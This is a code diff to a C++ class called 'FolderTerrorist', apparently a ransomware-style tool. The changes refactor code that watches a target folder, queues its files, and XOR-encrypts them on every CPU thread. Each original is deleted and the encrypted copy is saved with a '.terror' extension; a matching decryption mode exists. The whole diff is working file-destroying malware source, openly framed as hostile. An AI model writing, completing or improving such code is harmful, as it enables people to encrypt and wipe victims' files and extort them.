@@ -2,6 +2,14 @@
 #include <filesystem>
 #include <fstream>
 
+std::vector<uint8_t> keygen(size_t size) {
+    std::vector<uint8_t> key;
+    for(size_t i = 0; i < size; i++) {
+        key.push_back(rand());
+    }
+    return key;
+}
+
 FolderTerrorist::FolderTerrorist() {
     std::cout << "FolderTerrorist has been created!\n";
 }
@@ -23,12 +31,8 @@ std::vector<std::string> FolderTerrorist::GetFolderFiles() {
     return files;
 }
 
-void FolderTerrorist::KeyGen(size_t size) {
-    if(key.size() == 0) {
-        key = keygen(size);
-    } else {
-        std::cout << "the key already exists, use GetKey() to know value\n";
-    }
+void FolderTerrorist::SetKey(std::vector<uint8_t> key) {
+    this->key = key;
 }
 
 std::vector<uint8_t> FolderTerrorist::GetKey() {
@@ -43,29 +47,19 @@ std::vector<uint8_t> FolderTerrorist::GetKey() {
 void FolderTerrorist::UpdateQueue() {
     if(border == -1) {
         while (true) {
-            std::vector<std::string> folder_files = GetFolderFiles();
-            std::this_thread::sleep_for(std::chrono::seconds(5));
-            for (const auto &file: folder_files) {
-                if (std::find(files_queue.begin(), files_queue.end(), file) == files_queue.end()) {
-                    std::lock_guard<std::mutex> guard(mtx);
-                    std::cout << "A new file has been added to the queue: " << file << "\n";
-                    files_queue.push_front(file);
-                }
-            }
+            std::this_thread::sleep_for(std::chrono::seconds(2));
+            ReleaseUpdate();
         }
-    } else {
-        while (border > 0) {
-            std::vector<std::string> folder_files = GetFolderFiles();
-            std::this_thread::sleep_for(std::chrono::seconds(5));
-            for (const auto &file: folder_files) {
-                if (std::find(files_queue.begin(), files_queue.end(), file) == files_queue.end()) {
-                    std::lock_guard<std::mutex> guard(mtx);
-                    std::cout << "A new file has been added to the queue: " << file << "\n";
-                    files_queue.push_front(file);
-                }
-            }
+    } else ReleaseUpdate();
+}
+
+void FolderTerrorist::ReleaseUpdate() {
+    std::vector<std::string> folder_files = GetFolderFiles();
+    for (const auto &file: folder_files) {
+        if (std::find(files_queue.begin(), files_queue.end(), file) == files_queue.end()) {
             std::lock_guard<std::mutex> guard(mtx);
-            if(border > 0) border--;
+            std::cout << "A new file has been added to the queue: " << file << "\n";
+            files_queue.push_front(file);
         }
     }
 }
@@ -74,69 +68,40 @@ void FolderTerrorist::ReleaseQueue(std::string mode) {
     std::string filename;
     if(border == -1) {
         while (true) {
-            {
-                std::lock_guard<std::mutex> guard(mtx);
-                if (!files_queue.empty()) {
-                    filename = files_queue.back();
-                    files_queue.pop_back();
-                }
-            }
-            if(mode == "encryption") {
-                size_t pos = filename.find_last_of(".");
-                std::string ext = filename.substr(pos);
-                if (std::filesystem::exists(std::filesystem::path(filename)) &&
-                    ext != ".terror") {
-                    XORencryption(filename);
-                }
-            }
-            if(mode == "decryption") {
-                size_t pos = filename.find_last_of(".");
-                std::string ext = filename.substr(pos);
-                if (std::filesystem::exists(std::filesystem::path(filename)) &&
-                    ext == ".terror") {
-                    XORencryption(filename);
-                }
-            }
+            RealaseMode(filename, mode);
         }
     } else {
         while (border > 0) {
-            {
-                std::lock_guard<std::mutex> guard(mtx);
-                if (!files_queue.empty()) {
-                    filename = files_queue.back();
-                    files_queue.pop_back();
-                }
-            }
-            if(mode == "encryption") {
-                if (std::filesystem::exists(std::filesystem::path(filename))) {
-                    size_t pos = filename.find_last_of(".");
-                    std::string ext = filename.substr(pos);
-                    if(ext != ".terror") XORencryption(filename);
-                }
-            }
-            if(mode == "decryption") {
-                if (std::filesystem::exists(std::filesystem::path(filename))) {
-                    size_t pos = filename.find_last_of(".");
-                    std::string ext = filename.substr(pos);
-                    if(ext != ".terror") XORencryption(filename);
-                }
-            }
-            std::lock_guard<std::mutex> guard(mtx);
+            RealaseMode(filename, mode);
+            std::lock_guard<std::mutex> guard(border_mtx);
             if(border > 0) border--;
         }
     }
 }
 
-std::vector<uint8_t> FolderTerrorist::keygen(size_t size) {
-    std::vector<uint8_t> key;
-    for(size_t i = 0; i < size; i++) {
-        key.push_back(rand());
+void FolderTerrorist::RealaseMode(std::string filename, std::string mode) {
+    {
+        std::lock_guard<std::mutex> guard(mtx);
+        if (!files_queue.empty()) {
+            filename = files_queue.back();
+            files_queue.pop_back();
+        }
     }
-    return key;
+    if(mode == "encryption") {
+        if (std::filesystem::exists(std::filesystem::path(filename)) &&
+        !filename.ends_with(".terror")) {
+            XORencryption(filename);
+        }
+    }
+    if(mode == "decryption") {
+        if (std::filesystem::exists(std::filesystem::path(filename)) &&
+        filename.ends_with(".terror")) {
+            XORencryption(filename);
+        }
+    }
 }
 
 void FolderTerrorist::XORencryption(const std::string &file_path) {
-    std::vector<uint8_t> key = GetKey();
     std::ifstream ifs(file_path, std::ios::binary);
     ifs.seekg(0, ifs.end);
     size_t file_size = ifs.tellg();
@@ -144,6 +109,10 @@ void FolderTerrorist::XORencryption(const std::string &file_path) {
     std::vector<uint8_t> bytes_buff(file_size);
     char *data_ptr = static_cast<char *>((void*)bytes_buff.data());
     ifs.read(data_ptr, file_size);
+    ifs.close();
+    std::remove(file_path.c_str());
+
+    std::vector<uint8_t> key = GetKey();
     for(size_t i = 0; i < bytes_buff.size();) {
         for(size_t j = 0; j < key.size(); j++) {
             bytes_buff[i] ^= key[j];
@@ -151,19 +120,18 @@ void FolderTerrorist::XORencryption(const std::string &file_path) {
             if(i == bytes_buff.size()) break;
         }
     }
-    ifs.close();
-    std::remove(file_path.c_str());
 
-    size_t pos = file_path.find_last_of(".");
-    std::string ext = file_path.substr(pos, file_path.size() - 1);
+    size_t last_point_pos = file_path.find_last_of(".");
+    std::string ext = file_path.substr(last_point_pos);
     std::filesystem::path path;
     if(ext != ".terror") {
         path = std::filesystem::path(file_path).parent_path() / std::filesystem::path(std::filesystem::path(file_path).filename().string() + ".terror");
     }
-    else {
-        std::string decrypted_file = file_path.substr(0, pos);
+    if(ext == ".terror") {
+        std::string decrypted_file = file_path.substr(0, last_point_pos);
         path = std::filesystem::path(file_path).parent_path() / std::filesystem::path(std::filesystem::path(decrypted_file).filename().string());
     }
+
     std::ofstream ofs(path, std::ios::binary);
     ofs.write(data_ptr, bytes_buff.size());
     ofs.close();
@@ -171,22 +139,27 @@ void FolderTerrorist::XORencryption(const std::string &file_path) {
 
 void FolderTerrorist::Start(std::string mode) {
     if(!folder_name.empty()) this->Start(GetFolderName(), mode);
-    else throw std::runtime_error("failed to start FolderTerrorist: target folder name is empty");
+    else throw std::runtime_error("error: failed to start FolderTerrorist: target folder name is empty");
 }
 
 void FolderTerrorist::Start(std::string path, std::string mode) {
-    //if(mode != "")
+    if(mode != "encryption" && mode != "decryption")throw std::runtime_error("error: unknown start mode, try \"encryption\" or \"decryption\" mode");
     this->folder_name = path;
     std::cout << "target is: " << GetFolderName() << std::endl;
     int max_num_of_threads = std::thread::hardware_concurrency();
-    //int max_num_of_threads = 2;
     threads.emplace_back(&FolderTerrorist::UpdateQueue, this);
-        for (int i = 0; i < max_num_of_threads - 1; i++) {
-            threads.emplace_back(&FolderTerrorist::ReleaseQueue, this, mode);
-        }
-        for (auto &i: threads) {
-            i.join();
-        }
+    if(border != -1){
+        threads[0].join();
+    }
+    for (int i = 0; i < max_num_of_threads - 1; i++) {
+        threads.emplace_back(&FolderTerrorist::ReleaseQueue, this, mode);
+    }
+    if(border == -1){
+        threads[0].join();
+    }
+    for (int i = 1; i < threads.size(); i++) {
+        threads[i].join();
+    }
 }
 
 void FolderTerrorist::SetTheBorder(int border) {
